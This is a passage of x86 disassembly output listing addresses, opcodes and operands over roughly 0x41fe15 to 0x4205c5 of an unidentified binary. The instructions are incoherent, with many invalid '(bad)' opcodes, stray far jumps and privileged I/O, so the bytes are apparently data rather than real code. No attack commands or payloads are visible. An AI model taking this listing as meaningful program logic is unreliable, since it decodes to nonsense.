  41fe15:	bound  edi,QWORD PTR [ebp+0x6a]
  41fe18:	dec    ebx
  41fe19:	ror    DWORD PTR [ecx+ecx*1],cl
  41fe1c:	leave  
  41fe1d:	fsubr  DWORD PTR [esi]
  41fe1f:	loope  0x41fda9
  41fe21:	(bad)  
  41fe23:	sahf   
  41fe24:	xchg   esi,eax
  41fe25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe26:	or     ch,dl
  41fe28:	retf   0x3669
  41fe2b:	repz sahf 
  41fe2d:	shr    DWORD PTR [eax+0x7f],1
  41fe30:	arpl   WORD PTR [edi-0x29],dx
  41fe33:	inc    eax
  41fe34:	lods   eax,DWORD PTR ds:[esi]
  41fe35:	mov    ds:0x924dddfd,al
  41fe3a:	and    eax,0x3e39c3da
  41fe3f:	clc    
  41fe40:	dec    ebp
  41fe41:	scas   al,BYTE PTR es:[edi]
  41fe42:	aaa    
  41fe43:	fcomp  QWORD PTR [edx-0x392bdedb]
  41fe49:	pushf  
  41fe4a:	sbb    ch,cl
  41fe4c:	and    edi,ecx
  41fe4e:	xchg   BYTE PTR [edi-0x68],ch
  41fe51:	adc    bl,BYTE PTR [edi-0x54]
  41fe54:	mov    cl,0x22
  41fe56:	adc    al,0x4b
  41fe58:	pop    ds
  41fe59:	add    eax,0x28e21f13
  41fe5e:	jnp    0x41fdf8
  41fe60:	and    ah,ah
  41fe62:	sbb    eax,0x75ca4841
  41fe67:	inc    DWORD PTR [esi+edi*1]
  41fe6a:	xor    eax,0x72916e90
  41fe6f:	mov    dl,0xc2
  41fe71:	rcl    BYTE PTR [esi],1
  41fe73:	sub    edi,esi
  41fe75:	lea    esi,[ebx+ebp*1]
  41fe78:	jbe    0x41fef0
  41fe7a:	rcr    BYTE PTR [ebp-0x7a],0x28
  41fe7e:	xor    ch,BYTE PTR [edi-0x64]
  41fe81:	std    
  41fe82:	shr    DWORD PTR [eax],0xe5
  41fe85:	dec    eax
  41fe86:	repnz sub DWORD PTR [ebx+0x1a25bec4],edx
  41fe8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe8e:	stos   DWORD PTR es:[edi],eax
  41fe8f:	imul   ecx,DWORD PTR [edi],0xacb94a34
  41fe95:	push   eax
  41fe96:	mov    al,0x1e
  41fe98:	jo     0x41fe4a
  41fe9a:	lahf   
  41fe9b:	adc    eax,DWORD PTR [edi+eiz*2-0x20]
  41fe9f:	mov    bl,0x51
  41fea1:	stos   DWORD PTR es:[edi],eax
  41fea2:	mov    eax,0x79e4389e
  41fea7:	push   ebp
  41fea8:	mov    al,ds:0x84858e1d
  41fead:	jge    0x41ff23
  41feaf:	out    dx,eax
  41feb0:	jnp    0x41fedb
  41feb2:	jmp    0x41fef2
  41feb4:	pop    ecx
  41feb5:	pop    es
  41feb6:	(bad)  
  41feb7:	ja     0x41ff22
  41feb9:	inc    ebp
  41feba:	ror    BYTE PTR [bp+di-0x40],cl
  41febe:	shr    DWORD PTR [edx+ecx*2-0x21],0x9e
  41fec3:	mov    ch,0xbc
  41fec5:	or     eax,0x1da13071
  41feca:	xchg   esp,eax
  41fecb:	adc    ch,BYTE PTR [ebx-0x78]
  41fece:	mov    ebx,0xd845b216
  41fed3:	sti    
  41fed4:	adc    al,0xed
  41fed6:	xchg   ebx,eax
  41fed7:	inc    ebp
  41fed8:	mov    bl,0xb
  41feda:	dec    esp
  41fedb:	mov    ebp,0x4f44efc6
  41fee0:	rol    DWORD PTR [ebp+0x26],cl
  41fee3:	push   0x5a170062
  41fee8:	sahf   
  41fee9:	dec    edi
  41feea:	sbb    DWORD PTR [edi],ecx
  41feec:	lods   al,BYTE PTR ds:[esi]
  41feed:	xor    BYTE PTR [ecx+0x468a37bc],cl
  41fef3:	popf   
  41fef4:	jge    0x41fedd
  41fef6:	ins    DWORD PTR es:[edi],dx
  41fef7:	lods   al,BYTE PTR ds:[esi]
  41fef8:	retf   
  41fef9:	xchg   ecx,eax
  41fefa:	je     0x41ff34
  41fefc:	jg     0x41ff12
  41fefe:	push   ebx
  41feff:	mov    dh,0x42
  41ff01:	aas    
  41ff02:	inc    ebx
  41ff03:	sbb    al,0x23
  41ff05:	pop    es
  41ff06:	shr    DWORD PTR ds:0xcc78c6d8,cl
  41ff0c:	(bad)  
  41ff0d:	adc    esp,eax
  41ff0f:	add    al,0x21
  41ff11:	xor    ebp,DWORD PTR [eax-0x33]
  41ff14:	fs ins DWORD PTR es:[edi],dx
  41ff16:	mov    DWORD PTR [ecx+0xb],esp
  41ff19:	fcom   QWORD PTR [edi]
  41ff1b:	mov    ah,BYTE PTR [edx]
  41ff1d:	popf   
  41ff1e:	adc    al,0x75
  41ff20:	sbb    BYTE PTR [esi-0x687c1bf3],ah
  41ff26:	jo     0x41ff4b
  41ff28:	or     eax,0x8bed3cb0
  41ff2d:	add    ah,al
  41ff2f:	loopne 0x41ff32
  41ff31:	sub    DWORD PTR [eax],0xebd1f153
  41ff37:	adc    al,0xd5
  41ff39:	jle    0x41ff08
  41ff3b:	push   0xffffff90
  41ff3d:	adc    edx,DWORD PTR [esi]
  41ff3f:	test   al,0x26
  41ff41:	clc    
  41ff42:	mov    ds:0x2f1ca732,eax
  41ff47:	fild   WORD PTR [edx-0x599591da]
  41ff4d:	(bad)  
  41ff4e:	xchg   edi,eax
  41ff4f:	gs in  al,dx
  41ff51:	push   ss
  41ff52:	cmp    eax,0xc6e80fbf
  41ff57:	loope  0x41ff31
  41ff59:	or     BYTE PTR [edx+ebp*4],bh
  41ff5c:	jae    0x41ff2a
  41ff5e:	push   ecx
  41ff5f:	and    dh,dh
  41ff61:	icebp  
  41ff62:	out    0x2,al
  41ff64:	mov    WORD PTR [esi],fs
  41ff66:	enter  0xe7e2,0xba
  41ff6a:	add    ebx,DWORD PTR [esi+0x36]
  41ff6d:	je     0x41ffbb
  41ff6f:	xchg   esi,eax
  41ff70:	retf   
  41ff71:	ror    BYTE PTR [esi+0x55],cl
  41ff74:	inc    edi
  41ff75:	sbb    al,0x7c
  41ff78:	cmc    
  41ff79:	jmp    0x51f1:0x3bdb4da8
  41ff80:	lods   eax,DWORD PTR ds:[esi]
  41ff81:	out    0x37,al
  41ff83:	dec    al
  41ff85:	mov    ebp,DWORD PTR [ebp+0x55]
  41ff88:	lahf   
  41ff89:	xchg   esi,eax
  41ff8a:	adc    ebp,edi
  41ff8c:	jge    0x41fffa
  41ff8e:	push   ds
  41ff8f:	mov    eax,0x5e2965f
  41ff94:	sar    DWORD PTR ds:0xce7a6ce7,1
  41ff9a:	enter  0x9eb3,0x93
  41ff9e:	mov    ds:0x27307084,eax
  41ffa3:	loope  0x41ffe2
  41ffa5:	mov    ch,dh
  41ffa7:	pop    ss
  41ffa8:	jl     0x41ffb9
  41ffaa:	mov    bl,0x7c
  41ffac:	jge    0x41ff5f
  41ffae:	(bad)  
  41ffaf:	xor    al,0x64
  41ffb1:	push   edi
  41ffb2:	ror    eax,cl
  41ffb4:	fldl2e 
  41ffb6:	mov    al,0x1a
  41ffb8:	mov    BYTE PTR [eax+0x54],ah
  41ffbb:	out    dx,eax
  41ffbc:	lea    ebx,ds:0x262a9947
  41ffc2:	push   ss
  41ffc3:	pop    edx
  41ffc4:	cmp    DWORD PTR [edi],ecx
  41ffc6:	or     DWORD PTR [ebp-0x6a0ccad8],0x70c6113c
  41ffd0:	or     bl,ch
  41ffd2:	dec    esi
  41ffd3:	sub    DWORD PTR [edi+0x0],ebp
  41ffd6:	push   ss
  41ffd7:	(bad)  [ecx+0x3]
  41ffda:	popf   
  41ffdb:	add    eax,0xefb4f4f0
  41ffe0:	retf   0xede4
  41ffe3:	pushf  
  41ffe4:	push   edi
  41ffe5:	cmp    ebx,esp
  41ffe7:	push   ds
  41ffe8:	xchg   edi,eax
  41ffe9:	add    edx,DWORD PTR es:[esi]
  41ffec:	mov    BYTE PTR [edi+edx*4-0x11f1474c],ah
  41fff3:	stos   DWORD PTR es:[edi],eax
  41fff4:	cmp    DWORD PTR [edx],ebp
  41fff6:	ret    0x744d
  41fff9:	xor    al,0x5a
  41fffb:	and    DWORD PTR [esi-0x76f4a0c6],esi
  420001:	cdq    
  420002:	cmp    eax,0x1835eb9e
  420007:	pop    eax
  420008:	cs push ss
  42000a:	inc    esi
  42000b:	pop    edx
  42000c:	lods   eax,DWORD PTR ds:[esi]
  42000d:	inc    esp
  42000e:	push   ss
  42000f:	inc    edx
  420010:	sub    al,0xc2
  420012:	jmp    0xfaba:0xdfb1766c
  420019:	and    BYTE PTR [eax+0x4c],ah
  42001c:	cmp    cl,al
  42001e:	out    dx,al
  42001f:	mov    al,ds:0x2504cc8a
  420024:	iret   
  420025:	mov    ch,0xfe
  420027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420028:	jmp    0x7821:0x24bad154
  42002f:	mov    bh,BYTE PTR [esi-0x44223937]
  420035:	aam    0xc
  420037:	mov    bl,0x81
  420039:	sub    bh,bh
  42003b:	arpl   WORD PTR [ebp-0x78318b56],bp
  420041:	sbb    DWORD PTR [edx],edi
  420043:	and    esp,DWORD PTR [edx-0x58a6b3ac]
  420049:	ins    BYTE PTR es:[edi],dx
  42004a:	jno    0x41ffd9
  42004c:	jmp    0xa4f4b0e0
  420051:	in     eax,0x9a
  420053:	mov    ch,0x91
  420055:	pop    ss
  420056:	mov    cl,0x17
  420058:	pop    ebp
  420059:	dec    ebp
  42005a:	popf   
  42005b:	mov    cl,0x8b
  42005d:	out    0xb5,al
  42005f:	xchg   DWORD PTR [esi-0x74],esp
  420062:	ror    BYTE PTR [ecx+eiz*8+0x2aa45b28],1
  420069:	dec    ebx
  42006a:	sub    eax,0x47c06353
  42006f:	out    0xdc,eax
  420071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420072:	sbb    ecx,ecx
  420074:	cld    
  420075:	(bad)  
  420077:	xchg   esi,eax
  420078:	mov    dh,0x11
  42007a:	add    bh,dh
  42007c:	or     eax,DWORD PTR [ecx+0x6256e087]
  420082:	mov    dh,dh
  420084:	push   edx
  420085:	inc    esp
  420086:	cmp    eax,DWORD PTR [edi-0xa1e60fa]
  42008c:	xchg   DWORD PTR [ecx],edi
  42008e:	push   esi
  42008f:	mov    ebx,0xaaeee81b
  420094:	andnps xmm0,XMMWORD PTR [esi]
  420097:	fdiv   QWORD PTR [edi+0x43]
  42009a:	sar    ch,0xe8
  42009d:	das    
  42009e:	cli    
  42009f:	sub    edx,esp
  4200a1:	xchg   esp,eax
  4200a2:	mov    ds:0x68f5deb9,eax
  4200a7:	jecxz  0x4200e4
  4200a9:	arpl   WORD PTR [eax-0x7c336804],bp
  4200af:	stos   DWORD PTR es:[edi],eax
  4200b0:	aad    0x52
  4200b2:	loopne 0x4200c4
  4200b4:	imul   ebx,DWORD PTR [edi-0x63],0xffffffad
  4200b8:	test   al,0x3b
  4200ba:	in     al,0x3b
  4200bc:	call   0x3b10a238
  4200c1:	cmovg  edx,DWORD PTR [esi]
  4200c4:	cmp    DWORD PTR [edx],ebx
  4200c6:	lods   eax,DWORD PTR ds:[esi]
  4200c7:	mul    ebx
  4200c9:	in     eax,0xfc
  4200cb:	jnp    0x4200dc
  4200cd:	or     esp,edx
  4200cf:	and    DWORD PTR [ebx+0x5194e458],edi
  4200d5:	mov    dl,BYTE PTR [edi-0x4e]
  4200d8:	push   ss
  4200d9:	pop    ebp
  4200da:	icebp  
  4200db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200dc:	ja     0x420086
  4200de:	shr    DWORD PTR [eax+0x64623554],1
  4200e4:	ds mov esi,0xf56b664a
  4200ea:	or     al,0xa
  4200ec:	jecxz  0x4200a1
  4200ee:	mov    eax,0xcec7869
  4200f3:	inc    esp
  4200f4:	(bad)  
  4200f5:	out    dx,eax
  4200f6:	shr    DWORD PTR [edx],1
  4200f8:	ret    0x66c4
  4200fb:	fwait
  4200fc:	repz or eax,0x266c5577
  420102:	fidivr DWORD PTR [ecx+0x7188a37d]
  420108:	std    
  420109:	mov    cl,0x90
  42010b:	mov    esi,fs
  42010d:	xchg   edi,eax
  42010e:	or     eax,0xab41659a
  420113:	add    al,0x55
  420115:	adc    esi,DWORD PTR [eax+0x650df5fb]
  42011b:	adc    BYTE PTR [edi+0x51ad0a3],bl
  420121:	inc    edx
  420122:	mov    ah,0xaf
  420124:	in     eax,0x39
  420126:	inc    esi
  420127:	cmp    al,0x63
  420129:	cli    
  42012a:	inc    edx
  42012b:	out    0x9c,al
  42012d:	sbb    al,0xdc
  42012f:	dec    ebx
  420130:	jae    0x420110
  420132:	iret   
  420133:	sbb    esp,DWORD PTR [eax]
  420135:	or     edi,DWORD PTR [eax-0x3af60a20]
  42013b:	clc    
  42013c:	sbb    BYTE PTR [edi],cl
  42013e:	ret    
  42013f:	inc    DWORD PTR [ebp+ebp*1-0x6a]
  420143:	jbe    0x42018b
  420145:	fwait
  420146:	js     0x420186
  420148:	les    esp,FWORD PTR [edx]
  42014a:	xchg   edi,eax
  42014b:	outs   dx,BYTE PTR ds:[esi]
  42014c:	sbb    ebp,eax
  42014e:	gs fwait
  420150:	(bad)  
  420151:	in     al,dx
  420152:	stos   BYTE PTR es:[edi],al
  420153:	sbb    ebp,DWORD PTR [edi+0x17]
  420156:	clc    
  420157:	add    al,0xb3
  420159:	sbb    DWORD PTR [edx+0x52c887ec],ecx
  42015f:	fnstsw WORD PTR [eax-0x1c]
  420162:	push   0xffffffa9
  420164:	mov    WORD PTR [esi+0x198ab9b1],?
  42016a:	adc    al,0xd4
  42016c:	inc    edx
  42016d:	sbb    al,0x87
  42016f:	xchg   esp,eax
  420170:	push   es
  420171:	(bad)  
  420174:	rcr    esi,1
  420176:	int    0x7b
  420178:	add    bh,BYTE PTR [edi+edi*1+0x1bcbc5]
  42017f:	sub    BYTE PTR [ebp-0x4a],cl
  420182:	adc    dh,bh
  420184:	cld    
  420185:	bound  ebx,QWORD PTR [ecx-0x5774fc76]
  42018b:	xchg   edx,eax
  42018c:	adc    esp,DWORD PTR [eax]
  42018e:	xor    eax,DWORD PTR [edi-0x50]
  420191:	(bad)  
  420192:	retf   
  420193:	adc    eax,0x3c666e28
  420198:	and    DWORD PTR ss:[esi+0x51],edx
  42019c:	(bad)  
  42019d:	in     al,0xa4
  42019f:	call   0x656293b3
  4201a4:	sbb    ah,cl
  4201a6:	mov    WORD PTR [esi],cs
  4201a8:	xchg   edi,eax
  4201a9:	jle    0x4201ae
  4201ab:	mov    bl,0xc0
  4201ad:	pop    ss
  4201ae:	dec    esp
  4201af:	jnp    0x4201db
  4201b1:	test   al,0x34
  4201b3:	pushf  
  4201b4:	(bad)  [ecx+0x4cfdcb17]
  4201ba:	jae    0x42020d
  4201bc:	mov    bl,0x38
  4201be:	mov    dl,0x78
  4201c0:	sub    DWORD PTR [ebx-0x5b],edx
  4201c3:	aam    0x72
  4201c5:	jmp    0x200a35bf
  4201ca:	mov    ecx,ebx
  4201cc:	jno    0x420188
  4201ce:	(bad)  
  4201cf:	jmp    0x9d591358
  4201d4:	jp     0x420235
  4201d6:	mov    eax,0xe3e8ba32
  4201db:	dec    esp
  4201dc:	xchg   ebp,eax
  4201dd:	xchg   edx,eax
  4201de:	pop    edi
  4201df:	fistp  WORD PTR [ebx]
  4201e1:	jg     0x420209
  4201e3:	lock lods al,BYTE PTR ds:[esi]
  4201e5:	imul   edi,esp,0x34b9d1d6
  4201eb:	in     al,0xaa
  4201ed:	dec    esp
  4201ee:	leave  
  4201ef:	fimul  WORD PTR [esi+0x5c1f72c7]
  4201f5:	sbb    BYTE PTR [ebp+0x4aff7898],cl
  4201fb:	push   es
  4201fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201fd:	popa   
  4201fe:	ret    
  4201ff:	das    
  420200:	retf   
  420201:	popf   
  420202:	mov    DWORD PTR [ecx+0x626eaab5],eax
  420208:	mov    ch,BYTE PTR [esi+edi*2+0x60e2bd47]
  42020f:	jnp    0x4201b2
  420211:	jecxz  0x4201bd
  420213:	stos   DWORD PTR es:[edi],eax
  420214:	xchg   esi,eax
  420215:	add    BYTE PTR [esi-0x69],al
  420218:	adc    eax,0x44d23eb8
  42021d:	push   esp
  42021e:	xor    BYTE PTR [ebp+0x18],ch
  420221:	xchg   DWORD PTR [eax-0x6f],ebp
  420224:	jmp    0x42024b
  420226:	add    eax,0xcb1db743
  42022b:	jp     0x420205
  42022d:	fsub   DWORD PTR [ecx-0x777d73f6]
  420233:	mov    cx,0x5c3a
  420237:	mov    ecx,0xfe915449
  42023c:	iret   
  42023d:	test   al,0x31
  42023f:	jecxz  0x42023e
  420241:	lea    esi,[edx-0x38]
  420244:	jmp    0xe79686a6
  420249:	inc    ebx
  42024a:	jl     0x420254
  42024c:	ror    BYTE PTR [edi-0x5331c292],cl
  420252:	mov    ds:0xc46abf4d,al
  420257:	xchg   edi,eax
  420258:	data16 aaa 
  42025a:	shl    DWORD PTR ds:0x3e0da109,0xe6
  420261:	push   ebx
  420262:	mov    ds:0x9b472819,al
  420267:	ss (bad) 
  42026a:	dec    ebp
  42026b:	and    DWORD PTR [edi+0x2dc9517b],edi
  420271:	or     eax,0x732cdf4f
  420276:	ss out 0xfd,al
  420279:	jnp    0x4202ae
  42027b:	mov    ch,0xa6
  42027d:	or     al,0xc2
  42027f:	jmp    0xaef2b2ad
  420284:	div    BYTE PTR [eax+0x20]
  420287:	cmp    ebp,DWORD PTR [eax-0x5c768730]
  42028d:	pop    edx
  42028e:	nop
  42028f:	std    
  420290:	fist   WORD PTR [edx]
  420292:	aas    
  420293:	sbb    dh,BYTE PTR [ecx+0x75]
  420296:	mov    esi,0xaa306432
  42029b:	sbb    ebp,DWORD PTR [ebx-0x5a]
  42029e:	mov    eax,0xbe7f1e63
  4202a3:	dec    ebp
  4202a4:	sbb    ebp,DWORD PTR [ebx]
  4202a6:	cmp    eax,ecx
  4202a8:	dec    esi
  4202a9:	jecxz  0x42022e
  4202ab:	mov    edx,0x6a17590e
  4202b0:	or     al,0x33
  4202b2:	rcr    BYTE PTR [edi],0x4c
  4202b5:	xor    bl,BYTE PTR [edx+0x60575e6]
  4202bb:	push   ss
  4202bc:	(bad)  
  4202bd:	test   eax,0x236ab37e
  4202c2:	add    BYTE PTR [edi],ah
  4202c4:	jp     0x420285
  4202c6:	sbb    DWORD PTR [edi+0x24],0xbc574c10
  4202cd:	push   esi
  4202ce:	xor    al,0x40
  4202d0:	leave  
  4202d1:	mov    ebp,DWORD PTR [ecx+0x3f]
  4202d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202d5:	mov    eax,ds:0xb626b7b1
  4202da:	clc    
  4202db:	nop
  4202dc:	rcl    BYTE PTR [edi-0x674a620],cl
  4202e2:	call   0xd2f2877b
  4202e7:	push   ecx
  4202e8:	xchg   esp,eax
  4202e9:	push   ecx
  4202ea:	mov    dh,0x98
  4202ec:	inc    ecx
  4202ed:	daa    
  4202ee:	and    al,0x99
  4202f0:	fdecstp 
  4202f2:	jbe    0x420336
  4202f4:	fisub  DWORD PTR [ebx-0x789b22b8]
  4202fa:	jb     0x4202c8
  4202fc:	jecxz  0x420364
  4202fe:	dec    esi
  4202ff:	in     eax,dx
  420300:	add    BYTE PTR [esi+0x43ba90c7],0xe0
  420307:	xchg   ebx,eax
  420308:	sbb    eax,0x7af950d
  42030d:	adc    BYTE PTR [edx+ebp*8+0x1365fb71],0x65
  420315:	out    dx,al
  420316:	sbb    DWORD PTR [eax+0x3b],esi
  420319:	mov    edx,0x1c1d0c87
  42031e:	in     al,dx
  42031f:	mov    bl,0xaf
  420321:	xlat   BYTE PTR ds:[ebx]
  420322:	rcr    DWORD PTR [edx+0x4],cl
  420325:	test   al,0x40
  420327:	adc    ah,BYTE PTR [ebp+0x341bb7d8]
  42032d:	dec    ebp
  42032e:	into   
  42032f:	cs inc ebx
  420331:	sbb    esi,DWORD PTR [esi-0x647cb3ad]
  420337:	xchg   DWORD PTR [esp+esi*4+0x3e496589],esp
  42033e:	inc    ecx
  42033f:	mov    al,0xa9
  420341:	mov    ds:0xb6e4f7b1,al
  420346:	and    BYTE PTR [esi-0x57],bl
  420349:	dec    esi
  42034a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42034b:	retf   
  42034c:	imul   ebx,DWORD PTR [eax-0x1d],0xffffffaa
  420350:	sbb    dl,BYTE PTR [ebp+0x13]
  420353:	aaa    
  420354:	xchg   ebp,eax
  420355:	imul   esp,ebp,0xf20df7f0
  42035b:	xor    al,0x10
  42035d:	call   0x40c40864
  420362:	mov    cl,0x62
  420364:	xor    eax,0xa75fcb6b
  420369:	sbb    bh,BYTE PTR [eax]
  42036b:	sub    ebp,ebx
  42036d:	push   edi
  42036e:	je     0x420358
  420370:	in     al,dx
  420371:	jecxz  0x4203d2
  420373:	inc    ebp
  420374:	mov    al,ds:0xfa1dc2f8
  420379:	shr    BYTE PTR [ecx-0x21],cl
  42037c:	out    dx,eax
  42037d:	push   eax
  42037e:	jb     0x4203d0
  420380:	gs inc esi
  420382:	scas   eax,DWORD PTR es:[edi]
  420383:	push   ds
  420384:	(bad)  
  420385:	push   es
  420386:	ret    0x653c
  420389:	(bad)  [esi-0x49]
  42038c:	in     al,dx
  42038d:	fnsave [ecx-0x8]
  420390:	add    ebx,esp
  420392:	stos   BYTE PTR es:[edi],al
  420393:	xlat   BYTE PTR ds:[ebx]
  420394:	push   esi
  420395:	pop    edx
  420396:	call   0xfa55:0x1e8b27d9
  42039d:	adc    al,BYTE PTR [ecx+0x25]
  4203a0:	out    dx,eax
  4203a1:	dec    ebx
  4203a2:	dec    ebx
  4203a3:	imul   ebx,edx
  4203a6:	add    eax,0xafb253b1
  4203ab:	(bad)  [ecx-0x14507cc0]
  4203b1:	jb     0x42037d
  4203b3:	mov    BYTE PTR [ecx-0x4938b6d4],dl
  4203b9:	pop    ecx
  4203ba:	xor    BYTE PTR [ebx+eax*4-0x26],0x92
  4203bf:	xlat   BYTE PTR gs:[ebx]
  4203c1:	in     eax,0xc6
  4203c3:	inc    esp
  4203c4:	pop    ds
  4203c5:	sub    eax,DWORD PTR [ebx]
  4203c7:	mov    ebp,0x4534158e
  4203cc:	push   ss
  4203cd:	ficomp WORD PTR [edx+0x16]
  4203d0:	push   es
  4203d1:	pop    ebx
  4203d2:	xchg   ah,bh
  4203d4:	(bad)  
  4203d5:	push   0x61311826
  4203da:	out    0xe2,eax
  4203dc:	add    eax,DWORD PTR [edi-0x36a8cc30]
  4203e2:	mov    bh,0x2b
  4203e4:	in     al,0x2b
  4203e6:	inc    eax
  4203e7:	jo     0x4203d8
  4203e9:	lods   al,BYTE PTR ds:[esi]
  4203ea:	fwait
  4203eb:	iret   
  4203ec:	and    al,0xc
  4203ee:	(bad)  
  4203f0:	mov    dh,BYTE PTR [edi+esi*4+0x7ac9fc0e]
  4203f7:	inc    esi
  4203f8:	mov    edx,ss
  4203fa:	fs cdq 
  4203fc:	inc    edi
  4203fd:	jg     0x420396
  4203ff:	inc    ecx
  420400:	in     eax,dx
  420401:	jge    0x4203fc
  420403:	lds    ebx,FWORD PTR [edi]
  420405:	jne    0x4203d4
  420407:	add    al,0xe7
  420409:	int3   
  42040a:	adc    eax,0x6cc0692b
  42040f:	and    eax,0x9fb75b51
  420414:	push   ecx
  420415:	push   ebx
  420416:	jle    0x4203f1
  420418:	daa    
  420419:	ins    BYTE PTR es:[edi],dx
  42041a:	mov    ebp,0x94c36f78
  42041f:	xor    cl,dh
  420421:	mov    gs,WORD PTR [edi]
  420423:	mov    bh,0xba
  420425:	mov    dh,0x7
  420427:	push   ebx
  420428:	push   edi
  420429:	(bad)  
  42042a:	sbb    cl,BYTE PTR [ebx-0xe]
  42042d:	call   0xdd7de99b
  420432:	nop
  420433:	fcomi  st,st(0)
  420435:	iret   
  420436:	jne    0x42047c
  420438:	mov    esp,0x3b2816a9
  42043d:	lods   al,BYTE PTR ds:[esi]
  42043e:	sub    ah,BYTE PTR [ecx]
  420440:	fcom   DWORD PTR [esi+0x1754e9f7]
  420446:	pop    ebp
  420447:	paddusw mm2,QWORD PTR [ebx-0x4adafdff]
  42044e:	jecxz  0x4203da
  420450:	mov    cl,0x71
  420452:	test   DWORD PTR [edi-0x53],0x7225b5a5
  420459:	test   ecx,0x777da736
  42045f:	daa    
  420460:	xchg   esi,eax
  420461:	mov    al,BYTE PTR [edx-0x2a]
  420464:	adc    BYTE PTR [ebx-0x21],dh
  420467:	pop    esi
  420468:	loop   0x42045d
  42046a:	out    dx,al
  42046b:	mov    esp,DWORD PTR [ecx-0x6f]
  42046e:	jp     0x4204eb
  420470:	add    al,0xc7
  420472:	loope  0x42048f
  420474:	jns    0x4204f0
  420476:	mov    al,ds:0x4abdde3c
  42047b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42047d:	or     eax,0xa7a7e75b
  420482:	shl    DWORD PTR [ebx-0x51],1
  420485:	or     cl,BYTE PTR [eax-0x35b64c5b]
  42048b:	add    DWORD PTR [ecx],ecx
  42048d:	pop    esi
  42048e:	pop    ss
  42048f:	mov    edx,eax
  420491:	jmp    0x4204e8
  420493:	gs inc eax
  420495:	into   
  420496:	call   0x3f1f:0xe1dd88b0
  42049d:	daa    
  42049e:	jne    0x4204d2
  4204a0:	xor    DWORD PTR [edi-0x4d],ebx
  4204a3:	sub    DWORD PTR [ebp+0x68],edi
  4204a6:	ds mov bh,0xc7
  4204a9:	pop    edi
  4204aa:	sbb    DWORD PTR [edx],eax
  4204ac:	xor    BYTE PTR [edi+0x5072a006],bl
  4204b2:	setne  BYTE PTR [esi+0x3e]
  4204b6:	gs jno 0x4204af
  4204b9:	das    
  4204ba:	dec    ebx
  4204bb:	loope  0x4204b3
  4204bd:	jns    0x420527
  4204bf:	fcmovu st,st(7)
  4204c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204c2:	jg     0x42045f
  4204c4:	fistp  QWORD PTR [eax-0x2a30658c]
  4204ca:	lahf   
  4204cb:	clc    
  4204cc:	mov    ds:0x45ab5af8,eax
  4204d1:	jns    0x42051a
  4204d3:	popf   
  4204d4:	mov    ah,0x20
  4204d6:	push   esi
  4204d7:	repnz or dl,BYTE PTR [eax]
  4204da:	fadd   DWORD PTR [eax-0x1a40430e]
  4204e0:	(bad)  
  4204e2:	push   esi
  4204e3:	fdivrp st(0),st
  4204e5:	ret    0x5bb7
  4204e8:	jo     0x4204bb
  4204ea:	jmp    0x2c45:0x741c7bb7
  4204f1:	fimul  WORD PTR [eax]
  4204f3:	push   edi
  4204f4:	loopne 0x420563
  4204f6:	and    bh,BYTE PTR [esi+0x4688d833]
  4204fc:	inc    esp
  4204fd:	enter  0xc995,0xf
  420501:	jmp    0xf00edc76
  420506:	test   DWORD PTR [esi-0x1f],0xcbc5ccf5
  42050d:	(bad)  
  42050e:	jo     0x420517
  420510:	sar    DWORD PTR [ecx-0x5bd52625],0x1a
  420517:	shr    BYTE PTR ds:[ebp-0x69],0xeb
  42051c:	jb     0x4204a4
  42051e:	xor    BYTE PTR [edi],cl
  420520:	adc    dl,BYTE PTR [edi+0x5d]
  420523:	aas    
  420524:	ja     0x420581
  420526:	sahf   
  420527:	dec    esi
  420528:	jae    0x42051d
  42052a:	jl     0x420549
  42052c:	sub    ah,dl
  42052e:	push   esi
  42052f:	push   esp
  420530:	push   ebx
  420531:	mov    ds:0xfe893221,eax
  420536:	or     edx,DWORD PTR [edi]
  420538:	jb     0x4204d6
  42053a:	lock pop edx
  42053c:	cmp    al,0x20
  42053e:	inc    edi
  42053f:	dec    ebx
  420540:	dec    ecx
  420541:	mov    ah,0xd6
  420543:	cmp    al,0x31
  420545:	pop    ebx
  420546:	outs   dx,DWORD PTR ds:[esi]
  420547:	xchg   esi,eax
  420548:	out    dx,al
  420549:	pusha  
  42054a:	enter  0xb2c2,0x7d
  42054e:	scas   eax,DWORD PTR es:[edi]
  42054f:	icebp  
  420550:	jp     0x4205c9
  420552:	mov    esi,0xae9e6051
  420557:	or     cl,BYTE PTR ds:0xb61f2819
  42055d:	inc    ebx
  42055e:	cld    
  42055f:	sub    BYTE PTR [ebx],dh
  420561:	mov    eax,ds:0xd5d810de
  420566:	in     eax,0xc0
  420568:	push   esp
  420569:	mov    esi,0x6a5b4078
  42056e:	arpl   WORD PTR ds:0x343359b2,bp
  420574:	pop    es
  420575:	ror    DWORD PTR [eax-0x1193ed7],1
  42057b:	out    0xd8,al
  42057d:	fadd   DWORD PTR [esp+edi*2-0xd]
  420581:	hlt    
  420582:	push   esi
  420583:	pop    ebp
  420584:	cmp    BYTE PTR es:[ebx],ch
  420587:	add    cl,BYTE PTR [edi-0x4f]
  42058a:	js     0x420547
  42058c:	das    
  42058d:	loope  0x420580
  42058f:	js     0x42056d
  420591:	adc    eax,0xcc54c943
  420596:	xor    dh,BYTE PTR [edx+0x32]
  420599:	cmc    
  42059a:	(bad)  
  42059c:	inc    esp
  42059d:	int    0xe8
  42059f:	adc    al,ch
  4205a1:	push   esi
  4205a2:	outs   dx,BYTE PTR ds:[esi]
  4205a3:	jg     0x4205f9
  4205a5:	cmp    al,0xa0
  4205a7:	in     eax,0x19
  4205a9:	fcom   st(4)
  4205ab:	sub    eax,0x246945fe
  4205b0:	sbb    al,0xcf
  4205b2:	xchg   ebp,eax
  4205b3:	nop
  4205b4:	sub    DWORD PTR [edx+0x0],ebx
  4205b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205b8:	mov    bl,0x47
  4205ba:	not    BYTE PTR [ebp+0x3c]
  4205bd:	jne    0x420637
  4205bf:	push   esp
  4205c0:	mov    edi,0x7b1dcea4
  4205c5:	test   DWORD PTR [ebp+0x164db360],ebx
